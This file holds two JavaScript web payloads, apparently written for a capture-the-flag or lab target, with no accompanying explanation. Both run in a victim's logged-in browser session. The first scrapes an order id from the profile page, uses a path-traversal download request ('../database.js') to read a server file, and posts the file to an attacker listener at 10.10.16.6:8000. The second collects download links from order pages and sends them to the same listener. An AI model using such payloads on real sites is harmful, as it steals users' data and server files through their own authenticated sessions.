async function req1(){
	const profile = await fetch('/profile', {mode:'no-cors', credentials:'include', cache:'no-store'})
	const profiletext = await profile.text()
	console.log(profiletext)
	const o = profiletext;

	const pattern = /\/order\/(\d+)/;

	const matches = o.match(pattern);


	const lfi = await fetch(`/download/${matches[1]}?bookIds=1&bookIds=../database.js`, {mode:'no-cors', credentials:'include', cache:'no-store'})
	const reslfi = await lfi.blob()
	const exfil = await fetch('http://10.10.16.6:8000/exfil', { mode: 'no-cors', cache: 'no-store', method: 'post', body: reslfi });

}

req1()




---------------------------------------------------------------------------------------------------------------------------------------------



async function req1(){
	const profile = await fetch('/profile', {mode:'no-cors', credentials:'include', cache:'no-store'})
	const profiletext = await profile.text()
	console.log(profiletext)
	const o = profiletext;

	const pattern = /<a\s+href="\/order\/(\d+)">/g;

	const matches = [];

	let match;
	while ((match = pattern.exec(o)) !== null) {
		matches.push("/order/" + match[1]);
	}
	
	
	for (m in matches){
		const req = await fetch(m, {mode:'no-cors', credentials:'include', cache:'no-store'})
		const reqtext = await req.text()
		
		const matches2 = [];
		const o2 = reqtext;
		const pattern2 = /\/download\/\d+\?bookIds=(?:\d+(&amp;|&)?)+/g;

		let match2;

		while ((match2 = pattern2.exec(o2)) !== null) {
			matches2.push(match2[0]);
		}

		for (let i = 0; i < matches2.length; i++) {
			const exfil = await fetch('http://10.10.16.6:8000/exfil', { mode: 'no-cors', cache: 'no-store', method: 'post', body: matches2[i] });
		}
		
	}

}

req1()
